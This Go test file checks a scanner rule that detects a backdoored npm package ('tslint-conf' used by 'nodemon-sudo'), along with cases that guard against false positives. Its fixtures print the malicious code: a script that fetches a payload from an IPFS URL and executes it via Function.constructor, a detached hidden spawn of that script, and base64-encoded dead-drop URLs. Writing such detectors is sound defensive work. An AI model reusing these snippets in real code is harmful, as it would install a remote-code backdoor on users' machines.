package builtin

import (
	"strings"
	"testing"

	"github.com/harshmaur/audr/internal/parse"
)

func TestRule_NodemonSudoTslintConfCallerBackdoorIOC(t *testing.T) {
	raw := `const axios = require('axios');
const src = 'https://peach-eligible-penguin-917.mypinata.cloud/ipfs/bafkreigjnxn5vnn34rc5r43ajwwkmk4akqpm4awmq5gdhakgszpeqiffsu';
const s = (await axios.get(src, { headers: { 'x-secret-key': '_' } })).data.cookie;
const handler = new Function.constructor('require', s);
handler(require);`
	doc := parse.Parse("/repo/node_modules/tslint-conf/lib/caller.js", []byte(raw))
	if !fired(doc, "nodemon-sudo-tslint-conf-backdoor-ioc") {
		t.Fatalf("nodemon-sudo/tslint-conf caller IOC rule did not fire; got %v", applyRule(doc))
	}
}

func TestRule_NodemonSudoTslintConfCallerBackdoorIOCWindowsPath(t *testing.T) {
	raw := `const src = 'https://peach-eligible-penguin-917.mypinata.cloud/ipfs/bafkreigjnxn5vnn34rc5r43ajwwkmk4akqpm4awmq5gdhakgszpeqiffsu';
const handler = new Function.constructor('require', s);
handler(require);`
	path := strings.Join([]string{"C:", "repo", "node_modules", "tslint-conf", "lib", "caller.js"}, string(rune(92)))
	doc := parse.Parse(path, []byte(raw))
	if !fired(doc, "nodemon-sudo-tslint-conf-backdoor-ioc") {
		t.Fatalf("nodemon-sudo/tslint-conf caller IOC rule did not fire for a Windows path; got %v", applyRule(doc))
	}
}

func TestRule_NodemonSudoTslintConfRuntimeTriggerIOC(t *testing.T) {
	raw := `function runJobA(args) {
  const script = path.resolve(__dirname, './lib/caller.js');
  const child = spawn('node', [script, JSON.stringify(args)], {
    detached: true,
    stdio: 'ignore',
  });
  child.unref();
}`
	doc := parse.Parse("/repo/node_modules/tslint-conf/index.js", []byte(raw))
	if !fired(doc, "nodemon-sudo-tslint-conf-backdoor-ioc") {
		t.Fatalf("nodemon-sudo/tslint-conf runtime trigger IOC rule did not fire; got %v", applyRule(doc))
	}
}

func TestRule_NodemonSudoTslintConfDeadDropIOC(t *testing.T) {
	raw := `module.exports = {
  DEV_API_KEY: 'aHR0cHM6Ly9qc29ua2VlcGVyLmNvbS9iLzROQUtL',
  DEV_SECRET_KEY: 'eC1zZWNyZXQta2V5',
  DEV_SECRET_VALUE: 'Xw=='
};`
	doc := parse.Parse("/repo/node_modules/tslint-conf/lib/const.js", []byte(raw))
	if !fired(doc, "nodemon-sudo-tslint-conf-backdoor-ioc") {
		t.Fatalf("nodemon-sudo/tslint-conf dead-drop IOC rule did not fire; got %v", applyRule(doc))
	}
}

func TestRule_NodemonSudoTslintConfBackdoorIOCBoundsFalsePositives(t *testing.T) {
	callerIOC := []byte(`https://peach-eligible-penguin-917.mypinata.cloud/ipfs/bafkreigjnxn5vnn34rc5r43ajwwkmk4akqpm4awmq5gdhakgszpeqiffsu
new Function.constructor('require', s)`)
	cases := []struct {
		path string
		raw  []byte
	}{
		{"/repo/README.md", callerIOC},
		{"/repo/node_modules/other/lib/caller.js", callerIOC},
		{"/repo/node_modules/tslint-conf/lib/caller.js", []byte("module.exports = require('pino')")},
		{"/repo/node_modules/tslint-conf/index.js", []byte("spawn('node', ['worker.js'])")},
		{"/repo/node_modules/tslint-conf/lib/const.js", []byte("module.exports = { DEV_API_KEY: 'benign' }")},
	}
	for _, tc := range cases {
		doc := parse.Parse(tc.path, tc.raw)
		if fired(doc, "nodemon-sudo-tslint-conf-backdoor-ioc") {
			t.Fatalf("nodemon-sudo/tslint-conf IOC rule fired on benign path %s; got %v", tc.path, applyRule(doc))
		}
	}
}
